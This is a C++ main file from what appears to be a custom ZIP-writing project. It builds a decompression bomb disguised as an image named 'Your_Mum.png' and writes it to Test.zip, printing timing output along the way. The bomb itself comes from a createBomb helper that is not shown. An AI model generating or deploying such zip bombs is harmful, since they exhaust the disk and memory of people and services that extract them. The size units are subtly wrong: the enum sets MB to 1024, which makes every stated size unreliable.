#include <chrono>
#include <fstream>

#include "../include/zip_file_construction/LocalFileHeader.h"
#include "Helper.h"
#include "../include/zip_file_construction/CentralDirectory.h"
#include "zip_file_construction/ZipFile.h"
#include "deflation/BitWriter.h"
#include "deflation/HuffmanTable.h"
#include <iostream>

namespace {
    bool writeFile(const std::string &fileName, const std::span<uint8_t> data) {
        const auto start {std::chrono::steady_clock::now()};

        std::cout << "writing file: " << fileName << '\n';
        std::ofstream out(fileName, std::ios::binary);
        out.write(reinterpret_cast<const char *>(data.data()), static_cast<std::streamsize>(data.size()));

        const auto end {std::chrono::steady_clock::now()};
        std::cout << "Total file write time : " << std::chrono::duration_cast<std::chrono::milliseconds>(end-start) << '\n' ;
        return out.good();
    }
    enum class ByteSize:size_t {
        MB = 1024,
        GB = MB* 1024,
        TB = GB * 1024,
        PB = TB * 1024
    };
}


int main() {
    try {
        const auto start{std::chrono::steady_clock::now()};
        std::cout << "Creating local file header bomb\n";
        LocalFileHeader lfh{LocalFileHeader::createBomb("Your_Mum.png", (static_cast<size_t>(ByteSize::GB)*100) )};

        ZipFile zipFile{"Test.zip"};
        zipFile.addFile(std::move(lfh));

        const auto zipSerializationStart{std::chrono::steady_clock::now()};
        std::cout << "Serializing zip file"<<'\n';
        auto file{zipFile.serialize()};
        const auto zipSerializationEnd{std::chrono::steady_clock::now()};
        std::cout << "Total zip serialization time : " << std::chrono::duration_cast<std::chrono::milliseconds>(zipSerializationEnd-zipSerializationStart) << '\n';

        if (file) {
            if (writeFile(zipFile.filename_, *file)) {
                std::cout << "zip file written\n";
            } else {
                std::cout << "zip file failed write\n";
            }
        }

        const auto end{std::chrono::steady_clock::now()};

        std::cout << "Total run time : " << std::chrono::duration_cast<std::chrono::milliseconds>(end-start) << '\n';

    } catch (std::exception &e) {
        std::cout << "exception: " << e.what() << std::endl;
    }
}
